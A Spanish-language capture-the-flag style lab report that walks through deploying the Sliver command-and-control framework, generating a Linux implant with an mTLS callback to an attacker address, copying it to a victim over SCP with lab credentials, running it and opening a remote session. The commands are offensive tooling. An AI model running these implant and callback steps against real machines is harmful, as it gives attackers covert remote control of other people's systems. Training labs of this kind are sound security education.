# 🛡️ Informe de Laboratorio: HackLabs - C2 – Sliver Command & Control (Easy)
**IP Objetivo:** 10.10.10.114 | **Fecha:** 01/05/2026 | **Objetivo:** Preparación eJPTv2

## 🎯 Objetivo
Desplegar un entorno de Command & Control (C2) utilizando Sliver, generar un implant para Linux, transferirlo a la máquina víctima, ejecutarlo y tomar control remoto de la misma mediante una sesión C2.

## 🔍 Fase 1: Instalación y Configuración de Sliver
- Se instaló Sliver en Kali Linux mediante `curl -sSL https://sliver.sh/install | sudo bash`.
- Se inició el servidor Sliver con el comando `sliver`.

## 💥 Fase 2: Generación y Despliegue del Implant
- **Generación del implant:**
    - Comando: `generate --mtls 10.10.10.5:443 --os linux --arch amd64`
    - Resultado: Implant guardado como `/home/fernando/MIGHTY_PART`.
- **Inicio del listener:**
    - Comando: `mtls --lport 443`
    - Resultado: Listener mTLS activo en el puerto 443.
- **Transferencia a la víctima:**
    - Comando: `scp /home/fernando/MIGHTY_PART admin@10.10.10.114:/tmp/`
    - Credenciales: `admin:password1`
- **Ejecución en la víctima:**
    - Se accedió por SSH a la víctima, se dieron permisos de ejecución al implant y se lanzó en segundo plano.

## 🚀 Fase 3: Interacción con la Sesión C2
- **Verificación de sesión:** `sessions` mostró la sesión activa `04e0afe1`.
- **Uso de la sesión:** `use 04e0afe1` para interactuar con la víctima.
- **Enumeración de procesos:** `ps` mostró los procesos de la víctima, confirmando el control remoto total.

## 🧠 Lecciones Aprendidas
1.  **Ciclo de vida de un C2:** Instalación del servidor → Generación del implant → Despliegue → Ejecución → Interacción.
2.  **Transferencia de archivos:** `scp` es una herramienta efectiva para mover implants a una víctima cuando se tienen credenciales SSH.
3.  **Sliver como herramienta profesional:** Sliver es una alternativa moderna y potente a otros C2 como Metasploit, ampliamente utilizada en Red Team.

## 🏁 Conclusión
El laboratorio C2 demuestra el despliegue exitoso de un Command & Control con Sliver. Se generó un implant, se transfirió a la víctima, se ejecutó y se obtuvo una sesión C2 interactiva, permitiendo la enumeración de procesos del sistema comprometido.
